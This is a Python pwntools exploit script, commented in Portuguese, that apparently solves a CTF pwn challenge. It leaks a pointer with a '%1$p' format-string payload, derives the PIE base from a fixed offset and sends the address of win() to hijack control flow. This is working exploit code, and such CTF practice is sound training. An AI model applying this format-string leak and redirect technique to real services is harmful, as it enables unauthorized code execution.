from pwn import *

binary = './vuln_6'
context.binary = elf = ELF(binary)

# Conecta ao servidor remoto do CTF
p = remote('xebec.cylabacademy.net', 37770)

# 1. Envia o format string para vazar o ponteiro no índice 1
p.sendlineafter(b'Enter your name:', b'%1$p')

# 2. Lê a resposta ignorando linhas vazias ou ecos, pegando a linha do leak
response = b""
while True:
    line = p.recvline().strip()
    if line.startswith(b'0x'):
        response = line
        break

pie_leak = int(response, 16)
log.success(f"Leak obtido: {hex(pie_leak)}")

# 3. Offset estático verificado para o ponteiro do índice 1
STATIC_OFFSET = 162  

# Calcula a base real do PIE e o endereço da função win()
elf.address = pie_leak - STATIC_OFFSET
win_addr = elf.symbols['win']

log.success(f"PIE Base calculada: {hex(elf.address)}")
log.success(f"Endereço de win(): {hex(win_addr)}")

# 4. Envia o endereço absoluto de win() para o scanf realizar o salto
p.sendlineafter(b'enter the address to jump to, ex => 0x12345:', hex(win_addr).encode())

# 5. Interage com a sessão para imprimir a flag
p.interactive()